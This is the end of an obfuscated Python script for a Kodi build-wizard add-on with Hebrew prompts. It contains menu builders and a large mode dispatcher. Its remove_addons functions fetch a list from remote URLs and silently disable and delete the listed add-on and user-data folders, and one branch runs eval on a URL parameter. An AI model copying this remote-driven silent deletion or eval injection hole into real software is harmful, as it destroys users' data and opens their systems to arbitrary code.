	if OO00O0000O0O0O00O ==True :#line:6479
		try :#line:6480
			OO00OOOOOOO00O0O0 ,O0O0OO0O0O0O00O0O =wiz .splitNotify (NOTIFICATION )#line:6481
			if OO00OOOOOOO00O0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6482
			if STARTP2 ()=='ok':#line:6483
				notify .updateinfo (O0O0OO0O0O0O00O0O ,True )#line:6484
		except Exception as OO00O000OO0000000 :#line:6485
			wiz .log ("Error on Notifications Window: %s"%str (OO00O000OO0000000 ),xbmc .LOGERROR )#line:6486
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6487
def servicemanual ():#line:6488
	O0000O00OOO0OO0O0 =wiz .workingURL (HELPINFO )#line:6489
	if O0000O00OOO0OO0O0 ==True :#line:6490
		try :#line:6491
			OO0OO00OO0OO0OOO0 ,OOO00OO0O0O00O000 =wiz .splitNotify (HELPINFO )#line:6492
			if OO0OO00OO0OO0OOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:6493
			notify .helpinfo (OOO00OO0O0O00O000 ,True )#line:6494
		except Exception as O00OO00OOOOO000OO :#line:6495
			wiz .log ("Error on Notifications Window: %s"%str (O00OO00OOOOO000OO ),xbmc .LOGERROR )#line:6496
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:6497
def testupdate ():#line:6499
	if BUILDNAME =="":#line:6500
		notify .updateWindow ()#line:6501
	else :#line:6502
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:6503
def testfirst ():#line:6505
	notify .firstRun ()#line:6506
def testfirstRun ():#line:6508
	notify .firstRunSettings ()#line:6509
def fastinstall ():#line:6512
	notify .firstRuninstall ()#line:6513
def addDir (OO0OO000OO0O0O000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6520
	O00O000OOO0O00O0O =sys .argv [0 ]#line:6521
	if not mode ==None :O00O000OOO0O00O0O +="?mode=%s"%urllib .quote_plus (mode )#line:6522
	if not name ==None :O00O000OOO0O00O0O +="&name="+urllib .quote_plus (name )#line:6523
	if not url ==None :O00O000OOO0O00O0O +="&url="+urllib .quote_plus (url )#line:6524
	O0O0000OOO00OOOO0 =True #line:6525
	if themeit :OO0OO000OO0O0O000 =themeit %OO0OO000OO0O0O000 #line:6526
	OO00OO00OO0O000OO =xbmcgui .ListItem (OO0OO000OO0O0O000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6527
	OO00OO00OO0O000OO .setInfo (type ="Video",infoLabels ={"Title":OO0OO000OO0O0O000 ,"Plot":description })#line:6528
	OO00OO00OO0O000OO .setProperty ("Fanart_Image",fanart )#line:6529
	if not menu ==None :OO00OO00OO0O000OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:6530
	O0O0000OOO00OOOO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00O000OOO0O00O0O ,listitem =OO00OO00OO0O000OO ,isFolder =True )#line:6531
	return O0O0000OOO00OOOO0 #line:6532
def addFile (O00OOO0O00OOOOO0O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6534
	O000000O0OO00OOO0 =sys .argv [0 ]#line:6535
	if not mode ==None :O000000O0OO00OOO0 +="?mode=%s"%urllib .quote_plus (mode )#line:6536
	if not name ==None :O000000O0OO00OOO0 +="&name="+urllib .quote_plus (name )#line:6537
	if not url ==None :O000000O0OO00OOO0 +="&url="+urllib .quote_plus (url )#line:6538
	O000O0OOO0O0O00OO =True #line:6539
	if themeit :O00OOO0O00OOOOO0O =themeit %O00OOO0O00OOOOO0O #line:6540
	O000O0O00O0OO0OOO =xbmcgui .ListItem (O00OOO0O00OOOOO0O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6541
	O000O0O00O0OO0OOO .setInfo (type ="Video",infoLabels ={"Title":O00OOO0O00OOOOO0O ,"Plot":description })#line:6542
	O000O0O00O0OO0OOO .setProperty ("Fanart_Image",fanart )#line:6543
	if not menu ==None :O000O0O00O0OO0OOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:6544
	O000O0OOO0O0O00OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000000O0OO00OOO0 ,listitem =O000O0O00O0OO0OOO ,isFolder =False )#line:6545
	return O000O0OOO0O0O00OO #line:6546
def get_params ():#line:6548
	OOOO00OO000OO0O0O =[]#line:6549
	O0O0OOOO000OO00O0 =sys .argv [2 ]#line:6550
	if len (O0O0OOOO000OO00O0 )>=2 :#line:6551
		O000000OO000O0O0O =sys .argv [2 ]#line:6552
		OOOOO000000O00000 =O000000OO000O0O0O .replace ('?','')#line:6553
		if (O000000OO000O0O0O [len (O000000OO000O0O0O )-1 ]=='/'):#line:6554
			O000000OO000O0O0O =O000000OO000O0O0O [0 :len (O000000OO000O0O0O )-2 ]#line:6555
		O00OOO0O00O0O00OO =OOOOO000000O00000 .split ('&')#line:6556
		OOOO00OO000OO0O0O ={}#line:6557
		for O0OO0O0O00000000O in range (len (O00OOO0O00O0O00OO )):#line:6558
			OO0O00000O0O0O00O ={}#line:6559
			OO0O00000O0O0O00O =O00OOO0O00O0O00OO [O0OO0O0O00000000O ].split ('=')#line:6560
			if (len (OO0O00000O0O0O00O ))==2 :#line:6561
				OOOO00OO000OO0O0O [OO0O00000O0O0O00O [0 ]]=OO0O00000O0O0O00O [1 ]#line:6562
		return OOOO00OO000OO0O0O #line:6564
def remove_addons ():#line:6566
	try :#line:6567
			import json #line:6568
			OO0OOO000O0O00OOO =urllib2 .urlopen (remove_url ).readlines ()#line:6569
			for OO000OOO0O0OO0000 in OO0OOO000O0O00OOO :#line:6570
				O0OOO0OOOO0O00O0O =OO000OOO0O0OO0000 .split (':')[1 ].strip ()#line:6572
				OOO0OOOOO00O0O000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O0OOO0OOOO0O00O0O ,'false')#line:6573
				O00O00OO0OOOO0000 =xbmc .executeJSONRPC (OOO0OOOOO00O0O000 )#line:6574
				OO0O00O00OO0O0OOO =json .loads (O00O00OO0OOOO0000 )#line:6575
				O00O0OO000O00OOO0 =os .path .join (addons_folder ,O0OOO0OOOO0O00O0O )#line:6577
				if os .path .exists (O00O0OO000O00OOO0 ):#line:6579
					for O00OOO000OOO0O0O0 ,OOOOOOOOOOO0OOO0O ,OOOO0O0O000O0OOO0 in os .walk (O00O0OO000O00OOO0 ):#line:6580
						for O00O0O0OO00O00000 in OOOO0O0O000O0OOO0 :#line:6581
							os .unlink (os .path .join (O00OOO000OOO0O0O0 ,O00O0O0OO00O00000 ))#line:6582
						for O00OOO0O0OOOO000O in OOOOOOOOOOO0OOO0O :#line:6583
							shutil .rmtree (os .path .join (O00OOO000OOO0O0O0 ,O00OOO0O0OOOO000O ))#line:6584
					os .rmdir (O00O0OO000O00OOO0 )#line:6585
			xbmc .executebuiltin ('Container.Refresh')#line:6587
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:6588
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:6589
	except :pass #line:6590
def remove_addons2 ():#line:6591
	try :#line:6592
			import json #line:6593
			OO0O0O0OOOOOO0000 =urllib2 .urlopen (remove_url2 ).readlines ()#line:6594
			for O000OO000OO0OOOOO in OO0O0O0OOOOOO0000 :#line:6595
				O000OO00000OOO00O =O000OO000OO0OOOOO .split (':')[1 ].strip ()#line:6597
				OO0O0OO00000000OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O000OO00000OOO00O ,'false')#line:6598
				O00OO0OO00000000O =xbmc .executeJSONRPC (OO0O0OO00000000OO )#line:6599
				O0O0O00OO000OOO0O =json .loads (O00OO0OO00000000O )#line:6600
				OOO0000O00OO0O00O =os .path .join (user_folder ,O000OO00000OOO00O )#line:6602
				if os .path .exists (OOO0000O00OO0O00O ):#line:6604
					for OOO00OOOOOOOO00OO ,OO0O0OO0O0OOO0OOO ,OO000OO0O000OOOO0 in os .walk (OOO0000O00OO0O00O ):#line:6605
						for O00O000O0O00000OO in OO000OO0O000OOOO0 :#line:6606
							os .unlink (os .path .join (OOO00OOOOOOOO00OO ,O00O000O0O00000OO ))#line:6607
						for OO0OOOOOOO00OO000 in OO0O0OO0O0OOO0OOO :#line:6608
							shutil .rmtree (os .path .join (OOO00OOOOOOOO00OO ,OO0OOOOOOO00OO000 ))#line:6609
					os .rmdir (OOO0000O00OO0O00O )#line:6610
	except :pass #line:6612
params =get_params ()#line:6613
url =None #line:6614
name =None #line:6615
mode =None #line:6616
try :mode =urllib .unquote_plus (params ["mode"])#line:6618
except :pass #line:6619
try :name =urllib .unquote_plus (params ["name"])#line:6620
except :pass #line:6621
try :url =urllib .unquote_plus (params ["url"])#line:6622
except :pass #line:6623
def setView (OO0O00O0OOO00OO00 ,OO000OOO0O0000O00 ):#line:6627
	if wiz .getS ('auto-view')=='true':#line:6628
		O00OOOO00OO0O0O0O =wiz .getS (OO000OOO0O0000O00 )#line:6629
		if O00OOOO00OO0O0O0O =='50'and KODIV >=17 and SKIN =='skin.estuary':O00OOOO00OO0O0O0O ='55'#line:6630
		if O00OOOO00OO0O0O0O =='500'and KODIV >=17 and SKIN =='skin.estuary':O00OOOO00OO0O0O0O ='50'#line:6631
		wiz .ebi ("Container.SetViewMode(%s)"%O00OOOO00OO0O0O0O )#line:6632
if mode ==None :index ()#line:6634
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:6636
elif mode =='builds':buildMenu ()#line:6637
elif mode =='viewbuild':viewBuild (name )#line:6638
elif mode =='buildinfo':buildInfo (name )#line:6639
elif mode =='buildpreview':buildVideo (name )#line:6640
elif mode =='install':buildWizard (name ,url )#line:6641
elif mode =='theme':buildWizard (name ,mode ,url )#line:6642
elif mode =='viewthirdparty':viewThirdList (name )#line:6643
elif mode =='installthird':thirdPartyInstall (name ,url )#line:6644
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:6645
elif mode =='maint':maintMenu (name )#line:6647
elif mode =='passpin':passandpin ()#line:6648
elif mode =='backmyupbuild':backmyupbuild ()#line:6649
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:6650
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:6651
elif mode =='advancedsetting':advancedWindow (name )#line:6652
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:6653
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:6654
elif mode =='asciicheck':wiz .asciiCheck ()#line:6655
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:6656
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:6657
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:6658
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:6659
elif mode =='oldThumbs':wiz .oldThumbs ()#line:6660
elif mode =='clearbackup':wiz .cleanupBackup ()#line:6661
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:6662
elif mode =='currentsettings':viewAdvanced ()#line:6663
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:6664
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:6665
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:6666
elif mode =='fixskin':backtokodi ()#line:6667
elif mode =='testcommand':testcommand ()#line:6668
elif mode =='logsend':logsend ()#line:6669
elif mode =='rdon':rdon ()#line:6670
elif mode =='rdoff':rdoff ()#line:6671
elif mode =='setrd':setrealdebrid ()#line:6672
elif mode =='setrd2':setautorealdebrid ()#line:6673
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:6674
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:6675
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:6676
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:6677
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:6678
elif mode =='freshstart':freshStart ()#line:6679
elif mode =='forceupdate':wiz .forceUpdate ()#line:6680
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:6681
elif mode =='forceclose':wiz .killxbmc ()#line:6682
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:6683
elif mode =='hidepassword':wiz .hidePassword ()#line:6684
elif mode =='unhidepassword':wiz .unhidePassword ()#line:6685
elif mode =='enableaddons':enableAddons ()#line:6686
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:6687
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:6688
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:6689
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:6690
elif mode =='uploadlog':uploadLog .Main ()#line:6691
elif mode =='viewlog':LogViewer ()#line:6692
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:6693
elif mode =='viewerrorlog':errorChecking (all =True )#line:6694
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:6695
elif mode =='purgedb':purgeDb ()#line:6696
elif mode =='fixaddonupdate':fixUpdate ()#line:6697
elif mode =='removeaddons':removeAddonMenu ()#line:6698
elif mode =='removeaddon':removeAddon (name )#line:6699
elif mode =='removeaddondata':removeAddonDataMenu ()#line:6700
elif mode =='removedata':removeAddonData (name )#line:6701
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:6702
elif mode =='systeminfo':systemInfo ()#line:6703
elif mode =='restorezip':restoreit ('build')#line:6704
elif mode =='restoregui':restoreit ('gui')#line:6705
elif mode =='restoreaddon':restoreit ('addondata')#line:6706
elif mode =='restoreextzip':restoreextit ('build')#line:6707
elif mode =='restoreextgui':restoreextit ('gui')#line:6708
elif mode =='restoreextaddon':restoreextit ('addondata')#line:6709
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:6710
elif mode =='traktsync':traktsync ()#line:6711
elif mode =='apk':apkMenu (name )#line:6713
elif mode =='apkscrape':apkScraper (name )#line:6714
elif mode =='apkinstall':apkInstaller (name ,url )#line:6715
elif mode =='speed':speedMenu ()#line:6716
elif mode =='net':net_tools ()#line:6717
elif mode =='GetList':GetList (url )#line:6718
elif mode =='youtube':youtubeMenu (name )#line:6719
elif mode =='viewVideo':playVideo (url )#line:6720
elif mode =='addons':addonMenu (name )#line:6722
elif mode =='addoninstall':addonInstaller (name ,url )#line:6723
elif mode =='savedata':saveMenu ()#line:6725
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:6726
elif mode =='managedata':manageSaveData (name )#line:6727
elif mode =='whitelist':wiz .whiteList (name )#line:6728
elif mode =='trakt':traktMenu ()#line:6730
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:6731
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:6732
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:6733
elif mode =='cleartrakt':traktit .clearSaved (name )#line:6734
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:6735
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:6736
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:6737
elif mode =='realdebrid':realMenu ()#line:6739
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:6740
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:6741
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:6742
elif mode =='cleardebrid':debridit .clearSaved (name )#line:6743
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:6744
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:6745
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:6746
elif mode =='login':loginMenu ()#line:6748
elif mode =='savelogin':loginit .loginIt ('update',name )#line:6749
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:6750
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:6751
elif mode =='clearlogin':loginit .clearSaved (name )#line:6752
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:6753
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:6754
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:6755
elif mode =='contact':notify .contact (CONTACT )#line:6757
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:6758
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:6759
elif mode =='developer':developer ()#line:6761
elif mode =='converttext':wiz .convertText ()#line:6762
elif mode =='createqr':wiz .createQR ()#line:6763
elif mode =='testnotify':testnotify ()#line:6764
elif mode =='testnotify2':testnotify2 ()#line:6765
elif mode =='servicemanual':servicemanual ()#line:6766
elif mode =='fastinstall':fastinstall ()#line:6767
elif mode =='testupdate':testupdate ()#line:6768
elif mode =='testfirst':testfirst ()#line:6769
elif mode =='testfirstrun':testfirstRun ()#line:6770
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:6771
elif mode =='bg':wiz .bg_install (name ,url )#line:6773
elif mode =='bgcustom':wiz .bg_custom ()#line:6774
elif mode =='bgremove':wiz .bg_remove ()#line:6775
elif mode =='bgdefault':wiz .bg_default ()#line:6776
elif mode =='rdset':rdsetup ()#line:6777
elif mode =='mor':morsetup ()#line:6778
elif mode =='mor2':morsetup2 ()#line:6779
elif mode =='resolveurl':resolveurlsetup ()#line:6780
elif mode =='urlresolver':urlresolversetup ()#line:6781
elif mode =='forcefastupdate':forcefastupdate ()#line:6782
elif mode =='traktset':traktsetup ()#line:6783
elif mode =='placentaset':placentasetup ()#line:6784
elif mode =='flixnetset':flixnetsetup ()#line:6785
elif mode =='reptiliaset':reptiliasetup ()#line:6786
elif mode =='yodasset':yodasetup ()#line:6787
elif mode =='numbersset':numberssetup ()#line:6788
elif mode =='uranusset':uranussetup ()#line:6789
elif mode =='genesisset':genesissetup ()#line:6790
elif mode =='fastupdate':fastupdate ()#line:6791
elif mode =='folderback':folderback ()#line:6792
elif mode =='menudata':Menu ()#line:6793
elif mode =='infoupdate':infobuild ()#line:6794
elif mode =='wait':wait ()#line:6795
elif mode ==2 :#line:6796
        wiz .torent_menu ()#line:6797
elif mode ==3 :#line:6798
        wiz .popcorn_menu ()#line:6799
elif mode ==8 :#line:6800
        wiz .metaliq_fix ()#line:6801
elif mode ==9 :#line:6802
        wiz .quasar_menu ()#line:6803
elif mode ==5 :#line:6804
        swapSkins ('skin.Premium.mod')#line:6805
elif mode ==13 :#line:6806
        wiz .elementum_menu ()#line:6807
elif mode ==16 :#line:6808
        wiz .fix_wizard ()#line:6809
elif mode ==17 :#line:6810
        wiz .last_play ()#line:6811
elif mode ==18 :#line:6812
        wiz .normal_metalliq ()#line:6813
elif mode ==19 :#line:6814
        wiz .fast_metalliq ()#line:6815
elif mode ==20 :#line:6816
        wiz .fix_buffer2 ()#line:6817
elif mode ==21 :#line:6818
        wiz .fix_buffer3 ()#line:6819
elif mode ==11 :#line:6820
        wiz .fix_buffer ()#line:6821
elif mode ==15 :#line:6822
        wiz .fix_font ()#line:6823
elif mode ==14 :#line:6824
        wiz .clean_pass ()#line:6825
elif mode ==22 :#line:6826
        wiz .movie_update ()#line:6827
elif mode =='simpleiptv':#line:6830
    DIALOG =xbmcgui .Dialog ()#line:6832
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6833
    if choice ==1 :#line:6834
        iptvkodi17_18 ()#line:6835
    else :#line:6837
     sys .exit ()#line:6838
elif mode =='simpleidanplus':#line:6840
    DIALOG =xbmcgui .Dialog ()#line:6841
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6842
    if choice ==1 :#line:6843
        iptvidanplus ()#line:6844
    else :#line:6846
     sys .exit ()#line:6847
elif mode =='update_tele':updatetelemedia (NOTEID )#line:6849
elif mode =='adv_settings':buffer1 ()#line:6850
elif mode =='getpass':getpass ()#line:6851
elif mode =='setpass':setpass ()#line:6852
elif mode =='setuname':setuname ()#line:6853
elif mode =='passandUsername':passandUsername ()#line:6854
elif mode =='9':disply_hwr ()#line:6855
elif mode =='99':disply_hwr2 ()#line:6856
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))